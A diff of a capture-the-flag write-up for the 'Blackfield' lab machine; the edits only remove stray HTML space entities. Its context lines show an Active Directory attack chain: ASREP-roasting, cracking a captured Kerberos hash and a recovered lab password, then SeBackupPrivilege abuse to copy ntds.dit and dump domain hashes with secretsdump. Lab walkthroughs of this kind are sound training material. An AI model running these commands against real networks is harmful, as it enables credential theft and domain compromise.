@@ -64,9 +64,9 @@ smb: \> ls
   <TRUNCATED>
 ```
 
-There aren't any files within these directories, so I just compiled all the usernames into a list. There were over 300 different usernames. I tried to brute force SMB with `crackmapexec`, but no username served as a password.&#x20;
+There aren't any files within these directories, so I just compiled all the usernames into a list. There were over 300 different usernames. I tried to brute force SMB with `crackmapexec`, but no username served as a password.
 
-When trying ASREP-Roasting, it worked and we could get a hash for the `support` user.&#x20;
+When trying ASREP-Roasting, it worked and we could get a hash for the `support` user.
 
 ```bash
 $ impacket-GetNPUsers blackfield.local/ -dc-ip 10.129.105.19 -usersfile users -outputfile hashes.asreproast
@@ -74,7 +74,7 @@ $ cat hashes.asreproast
 $krb5asrep$23$support@BLACKFIELD.LOCAL:05a0cabfcc50e33745e2e89eefc310e4$419bbe29f6524d207946bf2c7a85d10c0b9fb7e2ee0539fb56de42e6140225b474ee337222074af7822f46d204e0681c257dc23b4652d3d30e08423df6b6b1e7167906a863d076a10fcac807ab4c8bfe972a993a3729ca87fd7fd65997bb84b7368691cabf62506880dcced356153685d65bca7f62b22b661f19f750c80b66774881efff55c6351e9c3027c7a7654bb470ef4ff1589738dd8191bdc5c38248c072478518c62d7d169aed727dc0f47a75b93e296cd90328b3a6a875e6a2db3f13769160e438c48664d5e81dcc68e2e3e79e5b8fb9af6288739bbbe7626ea5997d9c3691123afc869624bb2a299f5e1cc088bac9bf
 ```
 
-We can crack this hash using `john`.&#x20;
+We can crack this hash using `john`.
 
 ```
 $ john --wordlist=/usr/share/wordlists/rockyou.txt hashes.asreproast 
@@ -90,7 +90,7 @@ Session completed.
 
 ### Bloodhound -> Change Password
 
-This user had no access to any new shares. However, we can use `bloodhound-python` to find more information about the domain and this user.&#x20;
+This user had no access to any new shares. However, we can use `bloodhound-python` to find more information about the domain and this user.
 
 ```bash
 $ bloodhound-python -u support -p '#00^BlackKnight' -d blackfield.local -ns 10.129.105.19 -c all --dns-tcp
@@ -229,7 +229,7 @@ SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
 ```
 
-We have the `SeBackupPrivilege` enabled, which allows us to save the `sam` and `system` files from the registry. We can then use `secretsdump.py` to retrieve the updated hashes for the Administrator.&#x20;
+We have the `SeBackupPrivilege` enabled, which allows us to save the `sam` and `system` files from the registry. We can then use `secretsdump.py` to retrieve the updated hashes for the Administrator.
 
 Within `evil-winrm`, run the following:
 
@@ -277,14 +277,14 @@ expose %cdrive% E:X
 end backupX
 ```
 
-Then, run `robocopy` to copy the `ntds.dit` file over amd download it.&#x20;
+Then, run `robocopy` to copy the `ntds.dit` file over amd download it.
 
 ```
 robocopy /b E:\Windows\ntds . ntds.dit
 download ntds.dit
 ```
 
-We can then use `secretsdump.py` again to read the hashes.&#x20;
+We can then use `secretsdump.py` again to read the hashes.
 
 ```
 $ secretsdump.py -ntds ntds.dit -system system LOCAL
